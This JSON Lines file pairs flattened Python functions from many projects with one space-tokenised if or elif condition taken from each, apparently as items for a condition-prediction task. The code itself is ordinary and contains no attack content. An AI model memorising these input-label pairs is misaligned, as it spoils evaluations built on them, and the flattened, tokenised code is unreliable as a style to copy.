{"input": "def http_request(self, request): ntlm_auth_header = request.get_header(self.auth_header, None) if ntlm_auth_header is None: user, pw = self.passwd.find_user_password(None, request.get_full_url()) if pw is not None: auth = \"NTLM %s\" % ntlm.create_NTLM_NEGOTIATE_MESSAGE(user) request.add_unredirected_header(self.auth_header, auth) return request", "label": "if pw is not None :"}
{"input": "def _parse_yum_or_zypper_repositories(output): repos = [] current_repo = {} for line in output: line = line.strip() if not line or line.startswith(\"#\"): continue if line.startswith(\"[\"): if current_repo: repos.append(current_repo) current_repo = {} current_repo[\"name\"] = line[1:-1] if current_repo and \"=\" in line: key, value = line.split(\"=\", 1) current_repo[key] = value if current_repo: repos.append(current_repo) return repos", "label": "if not line or line . startswith ( \"#\" ) :"}
{"input": "def load_as_uint8(filename): image = gdal.Open(filename) image_array = np.array(image.ReadAsArray()) image_uint8 = np.zeros(image_array.shape, dtype=np.uint8) # rescale each band to be between 0, 255 for k, band in enumerate(image_array): band_max = np.max(band) if band_max != 0: band = band.astype(np.float) / band_max * 255.0 image_uint8[k, :, :] = band return image_uint8", "label": "if band_max != 0 :"}
{"input": "def _get_resource_group_name_of_staticsite(client, static_site_name): static_sites = client.list() for static_site in static_sites: if static_site.name.lower() == static_site_name.lower(): resource_group = _parse_resource_group_from_arm_id(static_site.id) if resource_group: return resource_group raise CLIError( \"Static site was '{}' not found in subscription.\".format(static_site_name) )", "label": "if resource_group :"}
{"input": "def _translate_trace_addr(self, trace_addr, obj=None): if obj is None: for obj in self._aslr_slides: # pylint: disable=redefined-argument-from-local if obj.contains_addr(trace_addr - self._aslr_slides[obj]): break else: raise Exception(\"Can't figure out which object this address belongs to\") if obj not in self._aslr_slides: raise Exception(\"Internal error: object is untranslated\") return trace_addr - self._aslr_slides[obj]", "label": "if obj . contains_addr ( trace_addr - self . _aslr_slides [ obj ] ) :"}
{"input": "def _register_builtin_handlers(self, events): for spec in handlers.BUILTIN_HANDLERS: if len(spec) == 2: event_name, handler = spec self.register(event_name, handler) else: event_name, handler, register_type = spec if register_type is handlers.REGISTER_FIRST: self._events.register_first(event_name, handler) elif register_type is handlers.REGISTER_LAST: self._events.register_last(event_name, handler)", "label": "if register_type is handlers . REGISTER_FIRST :"}
{"input": "def __fixdict(self, dict): for key in dict.keys(): if key[:6] == \"start_\": tag = key[6:] start, end = self.elements.get(tag, (None, None)) if start is None: self.elements[tag] = getattr(self, key), end elif key[:4] == \"end_\": tag = key[4:] start, end = self.elements.get(tag, (None, None)) if end is None: self.elements[tag] = start, getattr(self, key)", "label": "if start is None :"}
{"input": "def metadata(draft): test_metadata = {} json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema) for key, value in json_schema[\"properties\"].items(): response = \"Test response\" items = value[\"properties\"][\"value\"].get(\"items\") enum = value[\"properties\"][\"value\"].get(\"enum\") if items: # multiselect response = [items[\"enum\"][0]] elif enum: # singleselect response = enum[0] elif value[\"properties\"][\"value\"].get(\"properties\"): response = {\"question\": {\"value\": \"Test Response\"}} test_metadata[key] = {\"value\": response} return test_metadata", "label": "elif enum :"}
{"input": "def par_iter_next_batch(self, batch_ms: int): \"\"\"Batches par_iter_next.\"\"\" batch = [] if batch_ms == 0: batch.append(self.par_iter_next()) return batch t_end = time.time() + (0.001 * batch_ms) while time.time() < t_end: try: batch.append(self.par_iter_next()) except StopIteration: if len(batch) == 0: raise StopIteration else: pass return batch", "label": "if len ( batch ) == 0 :"}
{"input": "def get_node_map(self, nodes: List[Node], left_node_only=True): node_map = {} idx = 0 for node in nodes: if node.id != 0 and (not node.is_left_node and left_node_only): continue node_map[node.id] = idx idx += 1 return node_map", "label": "if node . id != 0 and ( not node . is_left_node and left_node_only ) :"}
{"input": "def compare_objects(left, right): left_fields = left.map_value.fields right_fields = right.map_value.fields for left_key, right_key in zip(sorted(left_fields), sorted(right_fields)): keyCompare = Order._compare_to(left_key, right_key) if keyCompare != 0: return keyCompare value_compare = Order.compare(left_fields[left_key], right_fields[right_key]) if value_compare != 0: return value_compare return Order._compare_to(len(left_fields), len(right_fields))", "label": "if keyCompare != 0 :"}
{"input": "def _resolve_policy_id(cmd, policy, policy_set_definition, client): policy_id = policy or policy_set_definition if not is_valid_resource_id(policy_id): if policy: policy_def = _get_custom_or_builtin_policy(cmd, client, policy) policy_id = policy_def.id else: policy_set_def = _get_custom_or_builtin_policy( cmd, client, policy_set_definition, None, None, True ) policy_id = policy_set_def.id return policy_id", "label": "if policy :"}
{"input": "def _passes_cortex_depth(line, min_depth): \"\"\"Do any genotypes in the cortex_var VCF line passes the minimum depth requirement?\"\"\" parts = line.split(\"\\t\") cov_index = parts[8].split(\":\").index(\"COV\") passes_depth = False for gt in parts[9:]: cur_cov = gt.split(\":\")[cov_index] cur_depth = sum(int(x) for x in cur_cov.split(\",\")) if cur_depth >= min_depth: passes_depth = True return passes_depth", "label": "if cur_depth >= min_depth :"}
{"input": "def __init__(self, itemtype, cnf={}, *, master=None, **kw): if not master: if \"refwindow\" in kw: master = kw[\"refwindow\"] elif \"refwindow\" in cnf: master = cnf[\"refwindow\"] else: master = tkinter._default_root if not master: raise RuntimeError( \"Too early to create display style: \" \"no root window\" ) self.tk = master.tk self.stylename = self.tk.call(\"tixDisplayStyle\", itemtype, *self._options(cnf, kw))", "label": "if not master :"}
{"input": "def serialize_groups_for_summary(node): groups = node.osf_groups n_groups = len(groups) group_string = \"\" for index, group in enumerate(groups): if index == n_groups - 1: separator = \"\" elif index == n_groups - 2: separator = \" & \" else: separator = \", \" group_string = group_string + group.name + separator return group_string", "label": "if index == n_groups - 1 :"}
{"input": "def do(txn): txn.execute( \"SELECT valid_to, mode, caseset, spec FROM testspec WHERE id = ?\", [specId] ) row = txn.fetchone() if row is None: raise Exception(\"no test specification with ID '%s'\" % specId) else: validTo, mode, caseset, spec = row if validTo is not None: raise Exception(\"test spec no longer active\") if not self._css.has_key(caseset): raise Exception(\"case set %s not loaded in database\" % caseset) spec = json.loads(spec) res = self._css[caseset].generateCasesByTestee(spec) return res", "label": "if not self . _css . has_key ( caseset ) :"}
{"input": "def get_and_set_titles(self): all_titles = [] for page in self.pages: if page.orig_phrase != \"\": all_titles.append(page.orig_phrase) all_titles.append(page.orig_phrase_norm) if page.wiki_title != \"\": all_titles.append(page.wiki_title) all_titles.append(page.wiki_title_norm) return set(all_titles)", "label": "if page . wiki_title != \"\" :"}
{"input": "def spool_print(*args, **kwargs): with _print_lock: if framework.Framework._spool: framework.Framework._spool.write(f\"{args[0]}{os.linesep}\") framework.Framework._spool.flush() # disable terminal output for server jobs if framework.Framework._mode == Mode.JOB: return # new print function must still use the old print function via the backup builtins._print(*args, **kwargs)", "label": "if framework . Framework . _spool :"}
{"input": "def matches(self, filepath): matched = False parent_path = os.path.dirname(filepath) parent_path_dirs = split_path(parent_path) for pattern in self.patterns: negative = pattern.exclusion match = pattern.match(filepath) if not match and parent_path != \"\": if len(pattern.dirs) <= len(parent_path_dirs): match = pattern.match( os.path.sep.join(parent_path_dirs[: len(pattern.dirs)]) ) if match: matched = not negative return matched", "label": "if not match and parent_path != \"\" :"}
{"input": "def __str__(self, prefix=\"\", printElemNumber=0): res = \"\" cnt = 0 for e in self.task_: elm = \"\" if printElemNumber: elm = \"(%d)\" % cnt res += prefix + (\"Task%s {\\n\" % elm) res += e.__str__(prefix + \" \", printElemNumber) res += prefix + \"}\\n\" cnt += 1 return res", "label": "if printElemNumber :"}
{"input": "def when(self, matches, context): ret = [] for to_check in matches.range( predicate=lambda match: \"has-neighbor-before\" in match.tags ): next_match = matches.next(to_check, index=0) next_group = matches.markers.next( to_check, lambda marker: marker.name == \"group\", 0 ) if next_group and (not next_match or next_group.start < next_match.start): next_match = next_group if next_match and not matches.input_string[ to_check.end : next_match.start ].strip(seps): break ret.append(to_check) return ret", "label": "if next_group and ( not next_match or next_group . start < next_match . start ) :"}
{"input": "def get_coeffs(e): coeffs = [] for du in all_delu_dict.keys(): if type(self.as_coeffs_dict[e]).__name__ == \"float\": coeffs.append(self.as_coeffs_dict[e]) elif du in self.as_coeffs_dict[e].keys(): coeffs.append(self.as_coeffs_dict[e][du]) else: coeffs.append(0) return np.array(coeffs)", "label": "elif du in self . as_coeffs_dict [ e ] . keys ( ) :"}
{"input": "def clean(self): username = self.cleaned_data.get(\"username\") password = self.cleaned_data.get(\"password\") message = ERROR_MESSAGE if username and password: self.user_cache = authenticate(username=username, password=password) if self.user_cache is None: raise ValidationError( message % {\"username\": self.username_field.verbose_name} ) elif not self.user_cache.is_active or not self.user_cache.is_staff: raise ValidationError( message % {\"username\": self.username_field.verbose_name} ) return self.cleaned_data", "label": "elif not self . user_cache . is_active or not self . user_cache . is_staff :"}
{"input": "def moveFailedFolder(filepath, failed_folder): if config.Config().failed_move(): root_path = str(pathlib.Path(filepath).parent) file_name = pathlib.Path(filepath).name destination_path = root_path + \"/\" + failed_folder + \"/\" if config.Config().soft_link(): print(\"[-]Create symlink to Failed output folder\") os.symlink(filepath, destination_path + \"/\" + file_name) else: print(\"[-]Move to Failed output folder\") shutil.move(filepath, destination_path) return", "label": "if config . Config ( ) . soft_link ( ) :"}
{"input": "def test_save_mp3(self, test_mode, bit_rate): if test_mode in [\"fileobj\", \"bytesio\"]: if bit_rate is not None and bit_rate < 1: raise unittest.SkipTest( \"mp3 format with variable bit rate is known to \" \"not yield the exact same result as sox command.\" ) self.assert_save_consistency(\"mp3\", compression=bit_rate, test_mode=test_mode)", "label": "if bit_rate is not None and bit_rate < 1 :"}
{"input": "def _upstream_nodes_executed(self, node: pipeline_pb2.PipelineNode) -> bool: \"\"\"Returns `True` if all the upstream nodes have been successfully executed.\"\"\" upstream_nodes = [ node for node_id, node in self._node_map.items() if node_id in set(node.upstream_nodes) ] if not upstream_nodes: return True for node in upstream_nodes: upstream_node_executions = task_gen_utils.get_executions( self._mlmd_handle, node ) if not task_gen_utils.is_latest_execution_successful(upstream_node_executions): return False return True", "label": "if not task_gen_utils . is_latest_execution_successful ( upstream_node_executions ) :"}
{"input": "def reinit(): for name, var in _ns_registry._registry[u\"pixie.stdlib\"]._registry.iteritems(): name = munge(name) if name in globals(): continue if var.is_defined() and isinstance(var.deref(), BaseCode): globals()[name] = unwrap(var) else: globals()[name] = var", "label": "if name in globals ( ) :"}
{"input": "def i2repr(self, pkt, x): if type(x) is list or type(x) is tuple: return repr(x) if self.multi: r = [] else: r = \"\" i = 0 while x: if x & 1: if self.multi: r += [self.names[i]] else: r += self.names[i] i += 1 x >>= 1 if self.multi: r = \"+\".join(r) return r", "label": "if self . multi :"}
{"input": "def prompts_dict(self, *args, **kwargs): r = super(WorkflowJobNode, self).prompts_dict(*args, **kwargs) # Explanation - WFJT extra_vars still break pattern, so they are not # put through prompts processing, but inventory and others are only accepted # if JT prompts for it, so it goes through this mechanism if self.workflow_job: if self.workflow_job.inventory_id: # workflow job inventory takes precedence r[\"inventory\"] = self.workflow_job.inventory if self.workflow_job.char_prompts: r.update(self.workflow_job.char_prompts) return r", "label": "if self . workflow_job . char_prompts :"}
{"input": "def did_evm_write_storage_callback(self, state, address, offset, value): # if in potential DAO check that write to storage values read before # the \"send\" for location, reads in self._get_location_and_reads(state): for address_i, offset_i in reads: if address_i == address: if state.can_be_true(offset == offset_i): self.add_finding(state, *location)", "label": "if state . can_be_true ( offset == offset_i ) :"}
{"input": "def update_quality_inspection(self): if self.inspection_required: reference_type = reference_name = \"\" if self.docstatus == 1: reference_name = self.name reference_type = \"Stock Entry\" for d in self.items: if d.quality_inspection: frappe.db.set_value( \"Quality Inspection\", d.quality_inspection, { \"reference_type\": reference_type, \"reference_name\": reference_name, }, )", "label": "if self . docstatus == 1 :"}
{"input": "def _target(self): if self.setup is not None: self.setup.push_thread() try: while self.running: record = self.subscriber.recv() if record: try: self.queue.put(record, timeout=0.05) except Full: pass finally: if self.setup is not None: self.setup.pop_thread()", "label": "if self . setup is not None :"}
{"input": "def check(self): global MySQLdb import MySQLdb try: args = {} if mysql_user: args[\"user\"] = mysql_user if mysql_pwd: args[\"passwd\"] = mysql_pwd if mysql_host: args[\"host\"] = mysql_host if mysql_port: args[\"port\"] = mysql_port if mysql_socket: args[\"unix_socket\"] = mysql_socket self.db = MySQLdb.connect(**args) except Exception as e: raise Exception(\"Cannot interface with MySQL server: %s\" % e)", "label": "if mysql_user :"}
{"input": "def writeBool(self, bool): if self.state == BOOL_WRITE: if bool: ctype = CompactType.TRUE else: ctype = CompactType.FALSE self.__writeFieldHeader(ctype, self.__bool_fid) elif self.state == CONTAINER_WRITE: if bool: self.__writeByte(CompactType.TRUE) else: self.__writeByte(CompactType.FALSE) else: raise AssertionError(\"Invalid state in compact protocol\")", "label": "if bool :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_module(d.getPrefixedString()) continue if tt == 18: self.set_version(d.getPrefixedString()) continue if tt == 24: self.set_instances(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def init_panel(self): if not hasattr(self, \"output_view\"): if is_ST3(): self.output_view = self.window.create_output_panel(\"markdown\") else: self.output_view = self.window.get_output_panel(\"markdown\")", "label": "if is_ST3 ( ) :"}
{"input": "def sql(self, engine): adapter = get_adapter(engine) tokens = [self.name, adapter.type_to_sql(self.type, self.limit)] for k, v in self.options.items(): result = adapter.column_option_to_sql(self.name, k, v) if result is None: continue elif isinstance(result, dict): # a way for column options to add constraints self.constraints.append(result[\"constraint\"]) else: tokens.append(result) return \" \".join(tokens)", "label": "if result is None :"}
{"input": "def get_igst_invoices(self): self.igst_invoices = [] for d in self.tax_details: is_igst = True if d[1] in self.gst_accounts.igst_account else False if is_igst and d[0] not in self.igst_invoices: self.igst_invoices.append(d[0])", "label": "if is_igst and d [ 0 ] not in self . igst_invoices :"}
{"input": "def updateParticle(part, best, phi1, phi2): u1 = numpy.random.uniform(0, phi1, len(part)) u2 = numpy.random.uniform(0, phi2, len(part)) v_u1 = u1 * (part.best - part) v_u2 = u2 * (best - part) part.speed += v_u1 + v_u2 for i, speed in enumerate(part.speed): if abs(speed) < part.smin: part.speed[i] = math.copysign(part.smin, speed) elif abs(speed) > part.smax: part.speed[i] = math.copysign(part.smax, speed) part += part.speed", "label": "elif abs ( speed ) > part . smax :"}
{"input": "def summaries_with_matching_keyword(keyword, summary_dir): \"\"\"Yields summary protos matching given keyword from event file.\"\"\" event_paths = tf.io.gfile.glob(os.path.join(summary_dir, \"events*\")) for event in tf.compat.v1.train.summary_iterator(event_paths[-1]): if event.summary is not None: for value in event.summary.value: if keyword in value.tag: logging.error(event) yield event.summary", "label": "if event . summary is not None :"}
{"input": "def _RemoveToken(self, doc_id, token): \"\"\"Removes a token occurrence for a document.\"\"\" if token in self._inverted_index: postings = self._inverted_index[token] postings.Remove(doc_id, token.position) if not postings.postings: del self._inverted_index[token]", "label": "if not postings . postings :"}
{"input": "def check_recursive_filters(self, space, name): for the_filter in self.filterdb.get_filters(space): for rule in the_filter.get_rules(): values = list(rule.values()) if issubclass(rule.__class__, MatchesFilterBase) and (name in values): return True return False", "label": "if issubclass ( rule . __class__ , MatchesFilterBase ) and ( name in values ) :"}
{"input": "def main(): for filename in sys.argv[1:]: if os.path.isdir(filename): print(filename, \"Directory!\") continue with open(filename, \"rb\") as f: data = f.read() if b\"\\0\" in data: print(filename, \"Binary!\") continue newdata = data.replace(b\"\\r\\n\", b\"\\n\") if newdata != data: print(filename) with open(filename, \"wb\") as f: f.write(newdata)", "label": "if b\"\\0\" in data :"}
{"input": "def fit(self, dataset, intent): self.language = dataset[\"language\"] self.slots_keywords = dict() utterances = dataset[\"intents\"][intent][\"utterances\"] for utterance in utterances: for chunk in utterance[\"data\"]: if \"slot_name\" in chunk: text = chunk[\"text\"] if self.config.get(\"lowercase\", False): text = text.lower() self.slots_keywords[text] = [chunk[\"entity\"], chunk[\"slot_name\"]] return self", "label": "if \"slot_name\" in chunk :"}
{"input": "def linkGradient(self, slaveGradient, connect=True): if connect: fn = lambda g, slave=slaveGradient: slave.restoreState(g.saveState()) self.linkedGradients[id(slaveGradient)] = fn self.sigGradientChanged.connect(fn) self.sigGradientChanged.emit(self) else: fn = self.linkedGradients.get(id(slaveGradient), None) if fn: self.sigGradientChanged.disconnect(fn)", "label": "if fn :"}
{"input": "def _get_field_values(serial_str, field_name): ret_list = [] stream = StringIO(serial_str) for obj_dict in yaml.safe_load(stream): if \"fields\" in obj_dict and field_name in obj_dict[\"fields\"]: field_value = obj_dict[\"fields\"][field_name] # yaml.safe_load will return non-string objects for some # of the fields we are interested in, this ensures that # everything comes back as a string if isinstance(field_value, six.string_types): ret_list.append(field_value) else: ret_list.append(str(field_value)) return ret_list", "label": "if \"fields\" in obj_dict and field_name in obj_dict [ \"fields\" ] :"}
{"input": "def scrapeHeadlines(text): headlines = \"\" lines = text.splitlines() for line in lines: if string.find(line, \"<a href\") == 0: pos1 = string.find(line, \"<b>\") if pos1 > 0: pos2 = string.find(line, \"</b>\") if pos2 > 0: headlines += line[pos1 + len(\"<b>\") : pos2] + \".\\n\" return headlines", "label": "if pos2 > 0 :"}
{"input": "def getCVEActions(self, cve, **args): actions = [] for plugin in self.getWebPlugins(): try: actions_ = plugin.getCVEActions(cve, **args) if actions_: for action in actions_: action[\"auth\"] = plugin.requiresAuth action[\"plugin\"] = plugin.getUID() actions.append(action) except Exception as e: print(\"[!] Plugin %s failed on fetching CVE actions!\" % plugin.getName()) print(\"[!] -> %s\" % e) return actions", "label": "if actions_ :"}
{"input": "def _sensors_to_fields(oldrec, sensor_map): # map a record with observation names to a record with db field names if oldrec: newrec = dict() for k in sensor_map: if sensor_map[k] in oldrec: newrec[k] = oldrec[sensor_map[k]] if newrec: newrec[\"dateTime\"] = oldrec[\"dateTime\"] newrec[\"usUnits\"] = oldrec[\"usUnits\"] return newrec return None", "label": "if sensor_map [ k ] in oldrec :"}
{"input": "def rdd_generator(): while not tf_feed.should_stop(): batch = tf_feed.next_batch(1) if len(batch[\"x\"]) > 0: features = batch[\"x\"][0] label = batch[\"y_\"][0] yield (features, label) else: return", "label": "if len ( batch [ \"x\" ] ) > 0 :"}
{"input": "def _get_modules(fn): finder = modulefinder.ModuleFinder() finder.run_script(fn) all = [] for m in finder.modules.values(): if not isinstance(m, modulefinder.Module): continue if not m.__file__: continue # skip shared object files if m.__file__.endswith(\".so\"): continue # skip mac system stuff... # FIXME: would need to augment with other OS's system stuff if m.__file__.startswith(\"/Library/Frameworks\"): continue all.append(m) return all", "label": "if m . __file__ . startswith ( \"/Library/Frameworks\" ) :"}
{"input": "def clean(self): d = super().clean() if d[\"issue_giftcard\"]: if d[\"tax_rule\"] and d[\"tax_rule\"].rate > 0: self.add_error( \"tax_rule\", _( \"Gift card products should not be associated with non-zero tax rates since sales tax will be applied when the gift card is redeemed.\" ), ) if d[\"admission\"]: self.add_error( \"admission\", _( \"Gift card products should not be admission products at the same time.\" ), ) return d", "label": "if d [ \"admission\" ] :"}
{"input": "def is_filtered_inherited_member(name: str, obj: Any) -> bool: if inspect.isclass(self.object): for cls in self.object.__mro__: if cls.__name__ == self.options.inherited_members and cls != self.object: # given member is a member of specified *super class* return True elif name in cls.__dict__: return False elif name in self.get_attr(cls, \"__annotations__\", {}): return False elif isinstance(obj, ObjectMember) and obj.class_ is cls: return False return False", "label": "elif isinstance ( obj , ObjectMember ) and obj . class_ is cls :"}
{"input": "def dictToKW(d): out = [] items = list(d.items()) items.sort() for k, v in items: if not isinstance(k, str): raise NonFormattableDict(\"%r ain't a string\" % k) if not r.match(k): raise NonFormattableDict(\"%r ain't an identifier\" % k) out.append(\"\\n\\0{}={},\".format(k, prettify(v))) return \"\".join(out)", "label": "if not r . match ( k ) :"}
{"input": "def report_add_status(torrentlist, succ_cnt, fail_cnt, fail_msgs): if fail_cnt == 0: torrentlist.report_message( \"Torrents Added\", \"{!success!}Successfully added %d torrent(s)\" % succ_cnt ) else: msg = ( \"{!error!}Failed to add the following %d torrent(s):\\n {!input!}\" % fail_cnt ) + \"\\n \".join(fail_msgs) if succ_cnt != 0: msg += \"\\n \\n{!success!}Successfully added %d torrent(s)\" % succ_cnt torrentlist.report_message(\"Torrent Add Report\", msg)", "label": "if succ_cnt != 0 :"}
{"input": "def merge(self, other): d = self._name2ft for name, (f, t) in other._name2ft.items(): if name in d: # Don't print here by default, since doing # so breaks some of the buildbots # print(\"*** DocTestRunner.merge: '\" + name + \"' in both\" \\ # \" testers; summing outcomes.\") f2, t2 = d[name] f = f + f2 t = t + t2 d[name] = f, t", "label": "if name in d :"}
{"input": "def handle_command(self, parameters): response = \"\" for ip_token in parameters: if is_ip(ip_token): ip = netaddr.IPNetwork(ip_token)[0] if not (ip.is_loopback() or ip.is_private() or ip.is_reserved()): response += \"{0} location: {1}\\n\".format( ip_token, ip_location(ip_token) ) else: response += \"{0}: hrm...loopback? private ip?\\n\".format(ip_token) else: response = \"{0} is not an IP address\".format(ip_token) return response", "label": "if is_ip ( ip_token ) :"}
{"input": "def letterrange(first, last, charset): for k in range(len(last)): for x in product(*[chain(charset)] * (k + 1)): result = \"\".join(x) if first: if first != result: continue else: first = None yield result if result == last: return", "label": "if first :"}
{"input": "def artifacts_base_dir(self): if not self._artifacts_base_dir: try: artifacts_base_dir = os.path.abspath( self.get_option(self.SECTION, \"artifacts_base_dir\") ) except ValidationError: artifacts_base_dir = os.path.abspath(\"logs\") if not os.path.exists(artifacts_base_dir): os.makedirs(artifacts_base_dir) os.chmod(self.artifacts_base_dir, 0o755) self._artifacts_base_dir = artifacts_base_dir return self._artifacts_base_dir", "label": "if not os . path . exists ( artifacts_base_dir ) :"}
{"input": "def _extract_changes(doc_map, changes, read_time): deletes = [] adds = [] updates = [] for name, value in changes.items(): if value == ChangeType.REMOVED: if name in doc_map: deletes.append(name) elif name in doc_map: if read_time is not None: value.read_time = read_time updates.append(value) else: if read_time is not None: value.read_time = read_time adds.append(value) return (deletes, adds, updates)", "label": "if name in doc_map :"}
{"input": "def __setattr__(self, name, val): BitmapSprite.__setattr__(self, name, val) if name in ( \"name\", \"size\", ): # no other reason to discard cache than just on path change if self.__dict__.get(\"name\") and self.__dict__.get(\"size\"): self.image_data = self.theme.load_icon(self.name, self.size, 0) else: self.image_data = None", "label": "if self . __dict__ . get ( \"name\" ) and self . __dict__ . get ( \"size\" ) :"}
{"input": "def extract_deps(file): # ~ print('Extracting from %s' % file) deps = set() for line in open(file).readlines(): line = line.strip() if line.startswith(\"import\") or line.startswith(\"from\"): words = line.split() if words[0] == \"import\" or (words[0] == \"from\" and words[2] == \"import\"): deps.add(words[1]) return deps", "label": "if line . startswith ( \"import\" ) or line . startswith ( \"from\" ) :"}
{"input": "def run_query(self, query, user): connection = self._get_connection() statement = None error = None try: statement = connection.execute(query) columns = [ {\"name\": n, \"friendly_name\": n, \"type\": _type_mapper(t)} for (n, t) in statement.columns().items() ] cnames = statement.column_names() rows = [dict(zip(cnames, row)) for row in statement] data = {\"columns\": columns, \"rows\": rows} json_data = json_dumps(data) finally: if statement is not None: statement.close() connection.close() return json_data, error", "label": "if statement is not None :"}
{"input": "def find_setup_py_above(a_file): \"Return the directory containing setup.py somewhere above *a_file*\" root = os.path.dirname(os.path.abspath(a_file)) while not os.path.exists(os.path.join(root, \"setup.py\")): prev, root = root, os.path.dirname(root) if root == prev: # Let's avoid infinite loops at root raise NoSetupPyFound(\"could not find my setup.py above %r\" % (a_file,)) return root", "label": "if root == prev :"}
{"input": "def check_index(self, is_sorted=True, unique=True, index=None): \"\"\"Sanity checks\"\"\" if not index: index = self.index if is_sorted: test = pd.DataFrame(lrange(len(index)), index=index) test_sorted = test.sort() if not test.index.equals(test_sorted.index): raise Exception(\"Data is not be sorted\") if unique: if len(index) != len(index.unique()): raise Exception(\"Duplicate index entries\")", "label": "if len ( index ) != len ( index . unique ( ) ) :"}
{"input": "def _compare_address_strings(self, a, b): # IPv6 address from different requests might be different a_segments = a.count(\":\") b_segments = b.count(\":\") if a_segments and b_segments: if a_segments == b_segments and a_segments in (4, 5, 6, 7): return True if a.rstrip(\":\").startswith(b.rstrip(\":\")) or b.rstrip(\":\").startswith( a.rstrip(\":\") ): return True if a_segments >= 2 and b_segments >= 2 and a.split(\":\")[:2] == b.split(\":\")[:2]: return True return a.split(\".\", 1)[-1] == b.split(\".\", 1)[-1]", "label": "if a_segments == b_segments and a_segments in ( 4 , 5 , 6 , 7 ) :"}
{"input": "def collect(self): for vacb in self.GetVACBs(): filename = vacb.SharedCacheMap.FileObject.file_name_with_drive() if filename: yield ( vacb, bool(self.kernel_address_space.vtop(vacb.BaseAddress.v())), vacb.BaseAddress.v(), vacb.Overlay.FileOffset.QuadPart, filename, )", "label": "if filename :"}
{"input": "def _visit_table(self, expr): node = expr.op() if isinstance(expr, ir.TableExpr): base_table = _find_blocking_table(expr) if base_table is not None: base_node = base_table.op() if self._is_root(base_node): pass else: # Foreign ref self.foreign_table = expr else: if not node.blocks(): for arg in node.flat_args(): if isinstance(arg, ir.Expr): self._visit(arg)", "label": "if not node . blocks ( ) :"}
{"input": "def channel_details(self) -> SnapChannelDetails: if self._channel_details is None: channel = self._payload.get(\"channel\") if channel is None: # Shouldn't happen, but raise an error if it does. raise RuntimeError(f\"no channel found for {self._payload!r}\") self._channel_details = SnapChannelDetails(channel) return self._channel_details", "label": "if channel is None :"}
{"input": "def __setattr__(self, attr, val): if hasattr(self, attr): old = getattr(self, attr) if isinstance(old, Setting): if isinstance(val, Setting): raise ValueError( \"Attempting to reassign setting %s with %s\" % (old, val) ) log.warn(\"Setting attr %s via __setattr__ instead of set()!\", attr) return old.set(val) log.debug(\"Setting {%s => %s}\" % (attr, val)) return object.__setattr__(self, attr, val)", "label": "if isinstance ( val , Setting ) :"}
{"input": "def FindEnclosingBracketGroup(input_str): stack = [] start = -1 for index, char in enumerate(input_str): if char in LBRACKETS: stack.append(char) if start == -1: start = index elif char in BRACKETS: if not stack: return (-1, -1) if stack.pop() != BRACKETS[char]: return (-1, -1) if not stack: return (start, index + 1) return (-1, -1)", "label": "if not stack :"}
{"input": "def copy_layer( layer, keep_bias=True, name_template=None, weights=None, reuse_symbolic_tensors=True, **kwargs ): config = layer.get_config() if name_template is None: config[\"name\"] = None else: config[\"name\"] = name_template % config[\"name\"] if keep_bias is False and config.get(\"use_bias\", False): config[\"use_bias\"] = False if weights is None: if reuse_symbolic_tensors: weights = layer.weights[:-1] else: weights = layer.get_weights()[:-1] return get_layer_from_config(layer, config, weights=weights, **kwargs)", "label": "if reuse_symbolic_tensors :"}
{"input": "def find_go_srcs(path): srcs, tests = [], [] for name in os.listdir(path): if name.startswith(\".\") or not name.endswith(\".go\"): continue if os.path.isfile(os.path.join(path, name)): if name.endswith(\"_test.go\"): tests.append(name) else: srcs.append(name) return srcs, tests", "label": "if name . endswith ( \"_test.go\" ) :"}
{"input": "def first_text(self, node): \"\"\"find first paragraph to use as a summary\"\"\" if node.tagname == \"paragraph\": return deepcopy(node) else: for child in node: if hasattr(child, \"tagname\"): ans = self.first_text(child) if ans: return ans return None", "label": "if hasattr ( child , \"tagname\" ) :"}
{"input": "def ServerInference(self): candidates = [] score = [] for symbol in self.symbols: for m in symbol.getMessages(): dst = m.getPattern()[0] if dst in candidates: score[candidates.index(dst)] += 1 else: candidates.append(dst) score.append(1) print(candidates) if score.count(max(score)) == 1 and len(candidates) > 2: self.server = candidates[score.index(max(score))]", "label": "if dst in candidates :"}
{"input": "def generateMapItemTypedNode(self, key, value): if type(value) == SigmaRegularExpressionModifier: regex = str(value) # Regular Expressions have to match the full value in QRadar if not (regex.startswith(\"^\") or regex.startswith(\".*\")): regex = \".*\" + regex if not (regex.endswith(\"$\") or regex.endswith(\".*\")): regex = regex + \".*\" return \"%s MATCHES %s\" % (self.cleanKey(key), self.generateValueNode(regex)) else: raise NotImplementedError( \"Type modifier '{}' is not supported by backend\".format(value.identifier) )", "label": "if not ( regex . endswith ( \"$\" ) or regex . endswith ( \".*\" ) ) :"}
{"input": "def get_max_vertical_scroll() -> int: # Make sure that the cursor line is not above the top. prev_lineno = ui_content.cursor_position.y used_height = 0 for lineno in range(ui_content.cursor_position.y - 1, -1, -1): used_height += get_line_height(lineno) if used_height > scroll_offsets_top: return prev_lineno else: prev_lineno = lineno return prev_lineno", "label": "if used_height > scroll_offsets_top :"}
{"input": "def _options_values(self): \"\"\"Simulate option values for partially configured objects.\"\"\" try: return self.__options_values except AttributeError: self.__options_values = {**self.keywords} position = 0 for name, option in self.func.__options__: if not option.positional: break # no positional left if name in self.keywords: continue # already fulfilled self.__options_values[name] = ( self.args[position] if len(self.args) >= position + 1 else None ) position += 1 return self.__options_values", "label": "if name in self . keywords :"}
{"input": "def key(self): addr = self.m(\"key\").obj_offset addr = self.read_ptr(addr) ret = \"\" if addr: ret = self.obj_vm.read(addr, 256) if ret: idx = ret.find(\"\\x00\") if idx != -1: ret = ret[:idx] else: ret = \"\" return ret", "label": "if ret :"}
{"input": "def get_file_path(self, filepath, token): try: encoded_path, _, user = self.updown_auth_manager.get_resource_info(token) if not self._valid_path(filepath, encoded_path): logger.info(\"Invalid path file!! %s: %s\" % (user, filepath)) raise NotFoundException(\"File not found\") logger.debug(\"Get file: user=%s path=%s\" % (user, filepath)) file_path = os.path.normpath(os.path.join(self.base_store_folder, encoded_path)) return file_path except (jwt.ExpiredSignature, jwt.DecodeError, AttributeError): raise NotFoundException(\"File not found\")", "label": "if not self . _valid_path ( filepath , encoded_path ) :"}
{"input": "def validate_and_handle(self): valid = self.validate(set_cursor=True) if valid: if self.accept_handler: keep_text = self.accept_handler(self) else: keep_text = False if not keep_text: self.reset()", "label": "if self . accept_handler :"}
